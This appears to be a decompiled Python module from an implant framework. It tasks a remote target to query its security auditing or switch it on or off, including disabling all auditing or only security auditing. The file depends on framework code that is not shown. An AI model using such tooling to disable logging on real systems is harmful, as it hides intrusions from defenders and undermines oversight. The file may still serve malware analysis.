# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Audit_Tasking.py
CMD_ACTION_STATUS = 1
CMD_ACTION_ON = 2
CMD_ACTION_OFF = 3
CMD_ACTION_DISABLE_ALL = 4
CMD_ACTION_DISABLE_SECURITY = 5
CMD_ACTION_ENABLE_ALL = 6
CMD_ACTION_ENABLE_SECURITY = 7

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.audit', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.audit.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['type'] == CMD_ACTION_STATUS:
        rpc = mca.security.cmd.audit.tasking.RPC_INFO_QUERY
    else:
        rpc = mca.security.cmd.audit.tasking.RPC_INFO_MODIFY
        tgtParams = mca.security.cmd.audit.ParamsModify()
        tgtParams.provider = mcl.tasking.technique.Lookup('AUDIT', mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, lpParams['method'])
        tgtParams.force = lpParams['force']
        if lpParams['type'] == CMD_ACTION_ON:
            tgtParams.type = mca.security.cmd.audit.ACTION_ON
        elif lpParams['type'] == CMD_ACTION_OFF:
            tgtParams.type = mca.security.cmd.audit.ACTION_OFF
        elif lpParams['type'] == CMD_ACTION_DISABLE_ALL:
            tgtParams.type = mca.security.cmd.audit.ACTION_DISABLE_ALL
        elif lpParams['type'] == CMD_ACTION_DISABLE_SECURITY:
            tgtParams.type = mca.security.cmd.audit.ACTION_DISABLE_SECURITY
        elif lpParams['type'] == CMD_ACTION_ENABLE_ALL:
            tgtParams.type = mca.security.cmd.audit.ACTION_ENABLE_ALL
        elif lpParams['type'] == CMD_ACTION_ENABLE_SECURITY:
            tgtParams.type = mca.security.cmd.audit.ACTION_ENABLE_SECURITY
        else:
            mcl.tasking.EchoError('Unknown type (%u)' % lpParams['type'])
            return False
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        taskXml = mcl.tasking.Tasking()
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, tgtParams.provider)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.audit.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)